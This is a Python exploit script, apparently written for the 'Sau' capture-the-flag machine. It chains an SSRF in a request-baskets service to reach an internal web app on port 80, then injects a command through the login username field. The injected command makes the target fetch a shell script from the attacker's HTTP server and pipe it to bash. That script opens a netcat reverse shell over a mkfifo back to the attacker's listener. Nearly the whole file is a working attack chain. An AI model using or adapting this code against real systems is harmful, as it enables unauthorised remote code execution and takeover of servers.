import string
import random
import requests
import os
import threading
import time
import argparse

parser = argparse.ArgumentParser(description="Programa para configurar conexiones.")
parser.add_argument('-u', '--sau-ip', dest='victim_ip', required=True, help="Ip of the sau machiene.")
parser.add_argument('-y', '--your-ip', dest='attacker_ip', required=True, help="Your ip.")
parser.add_argument('-p', '--port', dest='port_listener', type=int, required=True, help="Port for your nc listener.")
args = parser.parse_args()

victim = args.victim_ip
attacker = args.attacker_ip
nc_port = args.port_listener

sau_web_service_port = "55555"
localhost = "127.0.0.1"
url_vulnerable_service = f"http://{victim}:{sau_web_service_port}/"
ssrf_url = f"http://{victim}:{sau_web_service_port}/api/baskets/"
payload = f"http://{localhost}:80/"  # According to nmap port 80 is filtered. That means the firewall is blocking por 80. Which means it could be some web service.

range_basket_name = 10

# choose from all lowercase letter
letters = string.ascii_lowercase
basket_name = ''.join(random.choice(letters) for i in range(range_basket_name))

# We need to provide to the fordward_url the ip we want to call.
data = {
    "forward_url": f"{payload}",
    "proxy_response": True,
    "insecure_tls": False,
    "expand_path": True,
    "capacity": 250
}

r = requests.request(method="POST", url=ssrf_url + basket_name, json=data)

if r.status_code == 201:

    r = requests.request(method="GET", url=url_vulnerable_service + basket_name)

    if r.status_code == 200:
        print(f"Web service found inside {victim} -> {localhost}:80")

        nc_thread = threading.Thread(target=os.system, args=[f"nc -lvnp {nc_port}"])
        nc_thread.start()
        nc_thread.join(timeout=1)

        server_thread = threading.Thread(target=os.system, args=[f"python -m http.server 8003"])
        server_thread.start()

        time.sleep(1)

        os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh | chmod +x rev.sh")
        attack_thread = threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"])
        attack_thread.start()
        print("Trying to explote...")

        attack_thread.join(timeout=10)

        os.system("kill $(lsof -i :8003 | grep LISTEN | awk '{print $2}')")
        os.system("rm rev.sh")
    else:
        print("The port 80 is closed.")
else:
    print("The request was not valid.")